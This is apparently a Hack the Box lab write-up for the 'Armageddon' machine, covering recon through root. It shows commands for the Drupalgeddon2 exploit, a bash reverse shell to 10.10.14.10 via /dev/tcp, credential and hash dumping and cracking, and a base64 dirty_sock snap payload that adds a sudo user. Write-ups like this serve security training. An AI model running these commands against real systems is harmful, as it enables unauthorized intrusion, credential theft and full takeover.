# Hack the Box - Armageddon

# NMAP
```CSS
▶ nmap -Pn -sS -O -p- 10.10.10.233 -T4 --min-rate 1000 -oN ports.nmap

Nmap scan report for 10.10.10.233
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/15%OT=22%CT=1%CU=37173%PV=Y%DS=2%DC=I%G=Y%TM=6461351
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%
OS:TS=A)SEQ(SP=105%GCD=1%ISR=107%TI=Z%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW
OS:7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7120%
OS:W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CN
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.58 seconds
```

```CSS
▶ nmap -sC -sV -p 22,80 10.10.10.233 -oN services.nmap

Nmap scan report for 10.10.10.233
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82c6bbc7026a93bb7ccbdd9c30937934 (RSA)
|   256 3aca9530f312d7ca4505bcc7f116bbfc (ECDSA)
|_  256 7ad4b36879cf628a7d5a61e7060f5f33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```

---

## HTTP
  - Homepage
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/cb5ace1e-fa12-4cc5-b837-4107afa14893)

  - Registering as a new user failed as e-mail authentication is broken broken.
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4abc8d0c-1e80-479a-b0ca-3d6eaa55f28c)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/56f3bf84-4cfa-42ea-b0de-db89db01746d)

---

## HTTP Response Header
```http
HTTP/1.1 200 OK
Date: Sat, 30 Sep 2023 11:35:57 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
Content-Language: en
X-Frame-Options: SAMEORIGIN
X-Generator: Drupal 7 (http://drupal.org)
Content-Length: 7440
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
```

---

## Drupal Version
- `changelog.txt`.
```shell
curl -s 10.10.10.233/CHANGELOG.txt | head
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9e732973-d6d1-4287-acdd-47f785645a1f)

---

## Search for Exploit
```shell
root@kali# searchsploit drupal 7.56
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e8217b76-c132-4084-8b46-a44a1c78af1a)
```shell
root@kali# searchsploit -x php/webapps/44449.rb
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0592413d-3aca-457e-bab1-9404dc5c36e3)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bf373420-7ea7-4e73-b86c-8bd1884c4b06)
```shell
root@kali# searchsploit -x php/webapps/44449.rb
```

## Initial Foothold
```shell
root@kali# ruby 44449.rb http://10.10.10.233
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2a3f60b5-c3ef-4d41-a291-f752776f758b)

Bash Shell
```shell
root@kali# rlwrap nc -nlvvp 443
```
```shell
root@kali# curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.10/443 0>&1" 'http://10.10.10.233/shell.php'
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/868623ca-76ba-4fd4-bde1-6863c301137f)

`/var/www/html/sites/default/settings.php`
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b877cd91-e6e5-4406-8100-828b1a80722f)

```shell
Creds: drupaluser:CQHEy@9M*m23gBVj
```

## MySQL
```shell
bash-4.2$ mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
```

```shell
mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5bb2555b-8c25-4a61-83b6-cf15216edb4f)

```shell
Creds: brucetherealadmin:$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

## Crack Hash
```shell
root@kali# hashid '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'

root@kali# echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash.txt
```

```shell
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f117cef3-9ef1-4107-a71b-7d576b6ffe0c)

## Foothold
```shell
ssh brucetherealadmin@10.10.10.233
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/895a58dc-0c2b-45f1-a0a9-a944be595775)

## Privilege Escalation
```shell
[brucetherealadmin@armageddon ~]$ sudo -l
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fb12ff2c-5963-46ed-82e4-969d90e91e12)

```shell
[brucetherealadmin@armageddon ~]$ snap --version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
series  16
centos  7
kernel  3.10.0-1160.6.1.el7.x86_64
```

```shell
[brucetherealadmin@armageddon ~]$ python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "=="' | base64 -d > exploit.snap
```

```shell
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install --devmode exploit.snap
dirty-sock 0.1 installed
```
```shell
su dirty_sock
sudo su
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/48d5092f-ce7e-46f2-8699-cc43b0c7643e)
